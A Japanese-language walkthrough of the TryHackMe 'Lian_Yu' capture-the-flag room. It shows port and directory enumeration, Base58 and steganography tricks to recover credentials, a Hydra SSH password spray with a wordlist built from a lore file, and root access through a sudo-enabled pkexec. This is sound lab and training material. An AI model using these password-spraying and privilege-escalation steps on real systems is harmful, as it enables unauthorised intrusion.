# Lian_Yu CTF

https://tryhackme.com/room/lianyu

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.62.21
root@ip-10-10-91-214:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-28 23:59 GMT
Nmap scan report for 10.10.62.21
Host is up (0.0072s latency).
Not shown: 65530 closed ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
42706/tcp open  unknown
MAC Address: 02:B1:DC:56:4C:15 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 4.60 seconds

root@ip-10-10-91-214:~# sudo nmap -sV -p21,22,80,111,42706 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-28 23:59 GMT
Nmap scan report for 10.10.62.21
Host is up (0.00018s latency).

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.2
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
80/tcp    open  http    Apache httpd
111/tcp   open  rpcbind 2-4 (RPC #100000)
42706/tcp open  status  1 (RPC #100024)
MAC Address: 02:B1:DC:56:4C:15 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### gobuster

```shell
root@ip-10-10-91-214:~# gobuster dir -x=txt,php -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.62.21
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/island               (Status: 301) [Size: 234] [--> http://10.10.62.21/island/]
/server-status        (Status: 403) [Size: 199]
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished
===============================================================

root@ip-10-10-91-214:~# gobuster dir -x=txt,php -u http://$TARGET/island -w ./num.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.62.21/island
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                ./num.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/2100                 (Status: 301) [Size: 239] [--> http://10.10.62.21/island/2100/]
Progress: 30000 / 30003 (99.99%)
===============================================================
Finished
===============================================================
```

### /island

```text
Ohhh Noo, Don't Talk...............

I wasn't Expecting You at this Moment. I will meet you there

You should find a way to Lian_Yu as we are planed. The Code Word is:
vigilante
```

### /island/2100

```html
<!DOCTYPE html>
<html>
<body>

<h1 align=center>How Oliver Queen finds his way to Lian_Yu?</h1>


<p align=center >
<iframe width="640" height="480" src="https://www.youtube.com/embed/X8ZiFuW41yY">
</iframe> <p>
<!-- you can avail your .ticket here but how?   -->

</header>
</body>
</html>
```

拡張子ticketのファイルがあることを示唆している。

```shell
root@ip-10-10-91-214:~# gobuster dir -x=ticket -u http://$TARGET/island/2100/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.62.21/island/2100/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              ticket
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/green_arrow.ticket   (Status: 200) [Size: 71]
Progress: 436550 / 436552 (100.00%)
===============================================================
Finished
===============================================================
```

### /island/2100//green_arrow.ticket
```text
This is just a token to get into Queen's Gambit(Ship)

RTy8yhBQdscX
```

このトークンをBase58デコードすると下記になる。

```text
!#th3h00d
```

### FTP

vigilante / !#th3h00d でFTP接続できる。

```shell
ftp> ls -al
229 Entering Extended Passive Mode (|||57498|).
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 May 05  2020 .
drwxr-xr-x    4 0        0            4096 May 01  2020 ..
-rw-------    1 1001     1001           44 May 01  2020 .bash_history
-rw-r--r--    1 1001     1001          220 May 01  2020 .bash_logout
-rw-r--r--    1 1001     1001         3515 May 01  2020 .bashrc
-rw-r--r--    1 0        0            2483 May 01  2020 .other_user
-rw-r--r--    1 1001     1001          675 May 01  2020 .profile
-rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05  2020 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg
226 Directory send OK.
```

#### .bash_history  

```text
Sorry I couldn't Help Other user Might help
```

#### .other_user
```text
Slade Wilson was 16 years old when he enlisted in the United States Army, having lied about his age. After serving a stint in Korea, he was later assigned to Camp Washington where he had been promoted to the rank of major. In the early 1960s, he met Captain Adeline Kane, who was tasked with training young soldiers in new fighting techniques in anticipation of brewing troubles taking place in Vietnam. Kane was amazed at how skilled Slade was and how quickly he adapted to modern conventions of warfare. She immediately fell in love with him and realized that he was without a doubt the most able-bodied combatant that she had ever encountered. She offered to privately train Slade in guerrilla warfare. In less than a year, Slade mastered every fighting form presented to him and was soon promoted to the rank of lieutenant colonel. Six months later, Adeline and he were married and she became pregnant with their first child. The war in Vietnam began to escalate and Slade was shipped overseas. In the war, his unit massacred a village, an event which sickened him. He was also rescued by SAS member Wintergreen, to whom he would later return the favor.

Chosen for a secret experiment, the Army imbued him with enhanced physical powers in an attempt to create metahuman super-soldiers for the U.S. military. Deathstroke became a mercenary soon after the experiment when he defied orders and rescued his friend Wintergreen, who had been sent on a suicide mission by a commanding officer with a grudge.[7] However, Slade kept this career secret from his family, even though his wife was an expert military combat instructor.

A criminal named the Jackal took his younger son Joseph Wilson hostage to force Slade to divulge the name of a client who had hired him as an assassin. Slade refused, claiming it was against his personal honor code. He attacked and killed the kidnappers at the rendezvous. Unfortunately, Joseph's throat was slashed by one of the criminals before Slade could prevent it, destroying Joseph's vocal cords and rendering him mute.

After taking Joseph to the hospital, Adeline was enraged at his endangerment of her son and tried to kill Slade by shooting him, but only managed to destroy his right eye. Afterwards, his confidence in his physical abilities was such that he made no secret of his impaired vision, marked by his mask which has a black, featureless half covering his lost right eye. Without his mask, Slade wears an eyepatch to cover his eye.
```

#### aa.jpg

```shell
$ stegseek ./aa.jpg /usr/share/wordlists/rockyou.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "password"
[i] Original filename: "ss.zip".
[i] Extracting to "aa.jpg.out".
                                                  
$ unzip ./aa.jpg.out
Archive:  ./aa.jpg.out
  inflating: passwd.txt              
  inflating: shado
```

2ファイル出てきた。

```shell
$ cat passwd.txt 
This is your visa to Land on Lian_Yu # Just for Fun ***


a small Note about it


Having spent years on the island, Oliver learned how to be resourceful and 
set booby traps all over the island in the common event he ran into dangerous
people. The island is also home to many animals, including pheasants,
wild pigs and wolves.

$ cat shado     
--secret--
```

何かのパスワードと思われる。

#### Leave_me_alone.png

先頭をPNGのマジックナンバー'89 50 4E 47 0D 0A 1A 0A'にすると画像表示できた。

### SSH 
vigilante / --secret-- ではログインできなかった。

--secret-- がSSHのパスワードというのは間違いない。（THMのクイズで正解になったので）

ユーザー名が分からないが、以前の .other_user に含まれている可能性が高いと思われる。

.other_user ファイルから単語リストを抽出。

```shell
$ grep -oE '\b[a-zA-Z]+' .other_user | sort -u > names.txt
                                                             $ head ./names.txt    
a
A
abilities
able
about
adapted
Adeline
after
After
Afterwards
```

#### SSHパスワードスプレー

```shell
$ hydra -L names.txt -p --secret-- 10.10.62.21 ssh -t 30
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-28 20:18:06
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 30 tasks per 1 server, overall 30 tasks, 243 login tries (l:243/p:1), ~9 tries per task
[DATA] attacking ssh://10.10.62.21:22/
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-28 20:18:56
```

ヒットなし。

大文字が含まれるので、全部小文字にしてみる。

```shell
$ grep -oE '\b[a-zA-Z]+' .other_user | tr '[:upper:]' '[:lower:]' | sort -u > names2.txt

$ head names2.txt
a
abilities
able
about
adapted
adeline
after
afterwards
against
age
```

```shell
$ hydra -L names2.txt -p --secret-- 10.10.62.21 ssh -t 30                               
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-28 20:21:40
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 30 tasks per 1 server, overall 30 tasks, 235 login tries (l:235/p:1), ~8 tries per task
[DATA] attacking ssh://10.10.62.21:22/
[22][ssh] host: 10.10.62.21   login: slade   password: --secret--
[22][ssh] host: 10.10.62.21   login: slade   password: --secret--
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-28 20:22:31
```

ヒット。slade のパスワードと判明。

SSHログインできた。

```shell
$ ssh slade@10.10.62.21
slade@10.10.62.21's password: 
                              Way To SSH...
                          Loading.........Done.. 
                   Connecting To Lian_Yu  Happy Hacking

██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗██████╗ 
██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝╚════██╗
██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗   █████╔╝
██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝ 
╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗███████╗
 ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝


        ██╗     ██╗ █████╗ ███╗   ██╗     ██╗   ██╗██╗   ██╗
        ██║     ██║██╔══██╗████╗  ██║     ╚██╗ ██╔╝██║   ██║
        ██║     ██║███████║██╔██╗ ██║      ╚████╔╝ ██║   ██║
        ██║     ██║██╔══██║██║╚██╗██║       ╚██╔╝  ██║   ██║
        ███████╗██║██║  ██║██║ ╚████║███████╗██║   ╚██████╔╝
        ╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝    ╚═════╝  #

slade@LianYu:~$ cat user.txt
THM{P3................}
                        --Felicity Smoak
```

ユーザーフラグゲット。

## 権限昇格

```shell
slade@LianYu:~$ sudo -l
[sudo] password for slade: 
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
```

pkexec に sudo が付いている。

```shell
slade@LianYu:~$ sudo pkexec /bin/sh
# whoami
root
# cat /root/root.txt
                          Mission accomplished



You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 



THM{MY.....................}
                                                                              --DEATHSTROKE

Let me know your comments about this machine :)
I will be available @twitter @User6825
```

ルートフラグゲット！

## 振り返り

- ディレクトリの列挙はノーヒントではかなり困難。
- Base58 は初めて見た。
